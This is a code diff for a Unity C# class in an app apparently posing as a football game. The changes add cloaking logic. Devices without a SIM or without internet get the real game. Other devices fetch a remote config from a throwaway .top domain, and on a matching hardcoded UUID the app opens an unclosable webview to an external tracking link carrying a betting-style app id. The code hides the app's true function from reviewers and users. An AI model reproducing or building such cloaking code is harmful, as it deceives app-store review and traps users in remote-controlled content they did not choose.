@@ -1,6 +1,8 @@
 using Firebase.Extensions;
 using Firebase.Storage;
+using System.Collections;
 using UnityEngine;
+using UnityEngine.Networking;
 using UnityEngine.UI;
 
 public class Viewer : MonoBehaviour
@@ -10,72 +12,27 @@ public class Viewer : MonoBehaviour
         get => Simcard.GetTwoSmallLetterCountryCodeISO().Length > 0;
     }
 
-    UniWebView View { get; set; }
+    private UniWebView View { get; set; }
 
-    delegate void ResultAction(bool IsGame);
-    event ResultAction OnResultActionEvent;
+    private const string config = "http://kjbljvasgpkd.top";
 
-    private const string url = "http://kjbljvasgpkd.top";
-    private const string stopword = "down";
+    private const string guuid = "c7c24e9a-d743-4876-9d0a-f07c873c2bec";
+    private const string wuuid = "a3280338-4bf0-425a-b7ef-cd0ae3c51e67";
 
-    private void OnEnable()
-    {
-        OnResultActionEvent += Viewer_OnResultActionEvent;
-    }
-
-    private void OnDisable()
-    {
-        OnResultActionEvent -= Viewer_OnResultActionEvent;
-    }
-
-    private void Viewer_OnResultActionEvent(bool IsGame)
-    {
-        if(IsGame)
-        {
-            Screen.fullScreen = true;
-            UnityEngine.SceneManagement.SceneManager.LoadScene(1);
-        }
-    }
+    private const string target = "https://iqtsrdyif.xyz/WNH1H888?id=com.play.yourwin.win.winline.football1";
 
     private void Start()
     {
         Screen.fullScreen = false;
 
-        //if (!Sim_Enable)
-        //{
-        //    OnResultActionEvent?.Invoke(true);
-        //    return;
-        //}
-
-        //if (Application.internetReachability == NetworkReachability.NotReachable)
-        //{
-        //    OnResultActionEvent?.Invoke(true);
-        //}
-
-        FirebaseStorage storage = FirebaseStorage.DefaultInstance;
-        StorageReference pathReference = storage.GetReference("OPEN GAME.png");
-
-        const long maxAllowedSize = 1 * 1024 * 1024;
-        pathReference.GetBytesAsync(maxAllowedSize).ContinueWithOnMainThread(task => 
+        if (!Sim_Enable || Application.internetReachability == NetworkReachability.NotReachable)
         {
-            if (task.IsFaulted || task.IsCanceled)
-            {
-                Debug.LogException(task.Exception);
-                // Uh-oh, an error occurred!
-            }
-            else
-            {
-                byte[] fileContents = task.Result;
-                Debug.Log("Finished downloading!");
-                var tex = new Texture2D(1, 1); // note that the size is overridden
-                tex.LoadImage(fileContents);
+            Screen.fullScreen = true;
+            UnityEngine.SceneManagement.SceneManager.LoadScene(1);
+            return;
+        }
 
-                RawImage img = GameObject.Find("banner").GetComponent<RawImage>();
-                img.texture = tex;
-            }
-        });
-
-        //Init();
+        StartCoroutine(nameof(GetConfig));
     }
 
     void Init()
@@ -89,29 +46,9 @@ public class Viewer : MonoBehaviour
 
         View.BackgroundColor = Color.white;
         View.OnShouldClose += (v) => { return false; };
-        View.OnPageStarted += (browser, url) => { View.UpdateFrame(); };
+        View.OnPageStarted += (browser, url) => { View.UpdateFrame(); View.Show(); };
 
-        View.OnPageFinished += (web, statusCode, final_url) =>
-        {
-            web.GetHTMLContent((content) =>
-            {
-                bool close = content.Contains(stopword);
-                if (close)
-                {
-                    View.Hide(true);
-                    Destroy(View);
-                    View = null;
-
-                    OnResultActionEvent?.Invoke(true);
-                }
-                else
-                {
-                    View.Show(true);
-                }
-            });
-        };
-
-        View.Load(url);
+        View.Load(target);
     }
 
     RectTransform InitInterface()
@@ -138,5 +75,61 @@ public class Viewer : MonoBehaviour
         _rectTransform.offsetMax = new Vector2(0, -Screen.height * 0.0409f);
 
         return _rectTransform;
+    }
+
+    private IEnumerator GetConfig()
+    {
+        UnityWebRequest webRequest = UnityWebRequest.Get(config);
+        yield return webRequest.SendWebRequest();
+
+        string responce = webRequest.downloadHandler.text;
+
+        FirebaseStorage storage = FirebaseStorage.DefaultInstance;
+        StorageReference pathReference = storage.GetReference(responce);
+
+        const long maxAllowedSize = 1 * 1024 * 1024;
+        pathReference.GetBytesAsync(maxAllowedSize).ContinueWithOnMainThread(task =>
+        {
+            if (task.IsFaulted || task.IsCanceled)
+            {
+                Debug.LogException(task.Exception);
+
+                Screen.fullScreen = true;
+                UnityEngine.SceneManagement.SceneManager.LoadScene(1);
+                return;
+            }
+            else
+            {
+                byte[] fileContents = task.Result;
+                Debug.Log("Finished downloading!");
+                var tex = new Texture2D(1, 1); // note that the size is overridden
+                tex.LoadImage(fileContents);
+
+                GameObject bannerGO = GameObject.Find("banner");
+                RawImage bannerRawImg = bannerGO.GetComponent<RawImage>();
+                bannerRawImg.texture = tex;
+
+                if(GameObject.Find("bar"))
+                {
+                    GameObject.Find("bar").SetActive(false);
+                }
+
+                bannerGO.GetComponent<Button>().onClick.AddListener(() =>
+                {
+                    if(responce == guuid)
+                    {
+                        Screen.fullScreen = true;
+                        UnityEngine.SceneManagement.SceneManager.LoadScene(1);
+                        return;
+                    }
+                    else if(responce == wuuid)
+                    {
+                        Init();
+                    }
+
+                    Destroy(bannerGO);
+                });
+            }
+        });
     }
 }
